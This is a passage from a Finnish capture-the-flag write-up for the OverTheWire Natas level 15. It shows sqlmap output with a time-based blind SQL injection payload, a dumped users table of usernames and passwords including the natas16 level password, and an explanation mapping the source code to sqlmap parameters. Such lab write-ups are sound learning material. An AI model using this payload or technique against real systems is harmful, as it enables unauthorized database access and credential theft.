+    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
+---
+[13:00:10] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL < 5.0.12
+[13:00:10] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'natas15'
+[13:00:10] [INFO] fetching number of column(s) 'password,username' entries for table 'users' in database 'natas15'
+[13:00:10] [INFO] resumed: 4
+[13:00:10] [INFO] resumed: 6P151OntQe
+[13:00:10] [INFO] resumed: bob
+[13:00:10] [INFO] resumed: HLwuGKts2w
+[13:00:10] [INFO] resumed: charlie
+[13:00:10] [INFO] resumed: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+[13:00:10] [INFO] resumed: natas16
+[13:00:10] [INFO] resumed: hROtsfM734
+[13:00:10] [INFO] resumed: alice
+Database: natas15
+Table: users
+[4 entries]
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| bob      | 6P151OntQe                       |
+| charlie  | HLwuGKts2w                       |
+| natas16  | hPkjKYviLQctEW33QmuXL6eDVfMW4sGo |
+| alice    | hROtsfM734                       |
++----------+----------------------------------+
+
+[13:00:10] [INFO] table 'natas15.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org/dump/natas15/users.csv'                                                                                                  
+[13:00:10] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'                                                                                                                          
+[13:00:10] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 13:00:10 /2025-05-18/
+```
+
+---
+
+# Koskien tätä Level 15 - tietokannan selvitystä
+
+Eli tästä levelistä kuinka oltaisi menty selvittää ja ratkaisee. Perus siinä `index-source.html` välilehdessä kerrottiin pieni vihjeenä että siinä on rakennettu **taulukko** joka on nimetty `users` eli (alempi table luominen), ja tässä antoi vihjeenä että taulun sisällössä on **sarakkeet**: `username` ja `password`.
+
+
+```
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+``` 
+
+## Seuraavina, mistä me tiedettään tietokannan nimi?
+
+Tämä PHP-koodipätkässä kuin: `mysqli_select_db($link, 'natas15');` - joka valittiin/valitsee käytettäväksi tietokannaksi eli **natas15**.
+Lisäksi tämä on sensuroitu MySQL palvelin siksi lukee `localhost`: --> `$link = mysqli_connect('localhost', 'natas15', '<censored>');`
+
+Näin olleen miniyhteenvetona saattiin näin.
+- tietokanta/database: `natas15`
+- tietokannan taulukko: `users`
+- taulukkon sisältö: `username` ja `password`
+
+Tästä rakentuu se parametri **SQLmap**:
+
+| Asia              | Lähde koodissa                         | SQLMap-parametri              |
+| ----------------- | -------------------------------------- | ----------------------------- |
+| Tietokanta (`DB`) | `mysqli_select_db(..., 'natas15')`     | `-D natas15`                  |
+| Taulu             | `CREATE TABLE users (...)`             | `-T users`                    |
+| Sarakkeet         | `username`, `password`                 | `-C username,password`        |
+| Injektiokohta     | `$_REQUEST["username"]` → SQL-kysely   | `--data "username=..."`       |
+| Paluuviesti       | `"This user exists"` → blind injection | `--string "This user exists"` |
+
+---
+
+# mini yhteenveto 
 
 
 
